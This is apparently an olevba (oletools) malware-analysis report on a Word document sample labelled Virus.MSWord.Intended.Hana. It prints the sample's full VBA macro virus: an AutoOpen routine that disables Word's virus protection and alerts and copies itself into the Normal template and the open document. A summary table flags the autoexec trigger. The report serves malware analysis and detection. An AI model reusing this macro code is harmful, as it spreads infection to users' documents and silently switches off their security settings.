olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Intended.Hana-2c06b18134b491b43d5ae87a9986b49a9406920f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Intended.Hana-2c06b18134b491b43d5ae87a9986b49a9406920f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Hana.bas 
in file: Virus.MSWord.Intended.Hana-2c06b18134b491b43d5ae87a9986b49a9406920f - OLE stream: 'Macros/VBA/Hana'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Ìàêðîñ ñîçäàí 25.04.99 Duke // SMF"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.AutoOpen"
  On Error GoTo Hana

  Application.ScreenUpdating = False
  Application.DisplayAlerts = wdAlertsNone
  WordBasic.DisableAutoMacros 0
  Options.VirusProtection = False

  Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Hana", Object:=wdOrganizerObjectProjectItems
  Options.SaveNormalPrompt = False

  Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Hana", Object:=wdOrganizerObjectProjectItems
  ActiveDocument.SaveAs FileName:=ActiveDocument.Name, FileFormat:=wdFormatTemplate

Hana:

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

